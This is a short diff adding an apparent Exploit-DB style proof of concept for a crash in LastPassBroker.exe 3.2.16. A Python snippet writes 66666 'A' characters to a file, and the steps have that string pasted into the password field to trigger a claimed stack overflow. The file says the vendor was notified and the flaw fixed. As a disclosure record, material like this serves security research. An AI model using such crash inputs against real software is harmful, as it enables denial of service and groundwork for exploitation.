@@ -1,0 +1,28 @@
+'''
+********************************************************************************************
+# Exploit Title: Last PassBroker Stack-based BOF
+# Date: 9/23/2015
+# Exploit Author: Un_N0n
+# Software Link: https://lastpass.com/download
+# Version: 3.2.16
+# Tested on: Windows 7 x86(32 BIT)
+********************************************************************************************
+
+[Steps to Produce the Crash]:
+1- open 'LastPassBroker.exe'.
+2- A Input-Box will appear asking for Email and Password,
+   In password field paste in the contents of crash.txt
+3- Hit Login.
+~Software will Crash.
+
+[Code to produce crash.txt]: 
+'''
+junk = "A"*66666
+file = open("CRASH.txt",'w')
+file.write(junk)
+file.close()
+
+'''
+> Vendor Notified, Fixed in latest Release.
+**********************************************************************************************
+'''
